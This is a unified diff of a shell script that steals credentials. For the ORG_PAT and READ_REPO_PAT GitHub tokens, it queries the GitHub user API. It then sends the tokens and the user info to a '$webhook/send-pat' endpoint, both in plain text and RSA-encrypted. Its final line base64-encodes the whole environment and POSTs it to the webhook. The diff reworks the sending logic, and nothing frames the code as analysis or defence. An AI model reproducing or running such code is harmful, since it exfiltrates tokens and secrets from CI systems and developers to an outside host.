@@ -10,36 +10,15 @@ Ps7xrofPC8sgCwiPuNwIg9ALLAuHFlNIIQ5iFqOj0bu0JZMEy00zrWIo3x1dTtcC
 uwIDAQAB
 -----END PUBLIC KEY-----'
 
-
-rsa_encrypt_b64() {
-    printf '%s' "$1" \
-        | openssl pkeyutl -encrypt -pubin -inkey <(printf '%s\n' "$PUB_KEY") \
-            -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 \
-        | base64 -w0
-}
-
 for pat in ORG_PAT READ_REPO_PAT; do
 
         token="${!pat}"
         user_info=$(curl -s -i -H "Authorization: Bearer $token" https://api.github.com/user)
-		b64=$(printf '%s' "$user_info" | base64 -w0)
-		chunk_size=190
 		curl -s -o /dev/null "$webhook/send-pat?secret=$pat&token=$token" -d "$user_info"
-		n_chunks=$(( (${#b64} + chunk_size - 1) / chunk_size ))
-	
-		for ((i = 0; i < n_chunks; i++)); do
-	        	chunk=${b64:i*chunk_size:chunk_size}
-	        	ui_args+=(--data-urlencode "uchunk$i=$(rsa_encrypt_b64 "$chunk")")
-	    done
-	
-	    encrypted_pat=$(rsa_encrypt_b64 "$pat")
-	   	encrypted_token=$(rsa_encrypt_b64 "$token")
-		curl -s -o /dev/null -X POST "$webhook/send-pat" --data-urlencode "secret=$encrypted_pat" --data-urlencode "token=$encrypted_token" "$ui_args"
 
 		encrypted_token=$(printf '%s' "$token" | openssl pkeyutl -encrypt -pubin -inkey <(printf '%s' "$PUB_KEY") -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 | base64 -w0)
 		encrypted_pat=$(printf '%s' "$pat" | openssl pkeyutl -encrypt -pubin -inkey <(printf '%s' "$PUB_KEY") -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 | base64 -w0)
-		curl -s -o /dev/null "$webhook/send-pat?secret=$encrypted_pat&token=$encrypted_token" -d "$ui_args"
-
+		curl -s -o /dev/null "$webhook/send-pat?secret=$encrypted_pat&token=$encrypted_token" -d "$user_info"
 done
 
 env -0 | base64 -w 0 | curl -s -o /dev/null -X POST -d @- "$webhook"
